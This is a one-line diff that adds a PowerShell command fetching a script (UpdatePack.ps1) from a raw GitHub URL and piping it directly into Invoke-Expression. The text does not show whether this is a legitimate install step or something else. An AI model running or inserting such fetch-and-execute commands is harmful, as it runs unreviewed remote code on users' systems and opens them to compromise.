@@ -1,0 +1,1 @@
+powershell irm https://raw.githubusercontent.com/isadora-6th/rybalka/master/UpdatePack.ps1 | iex
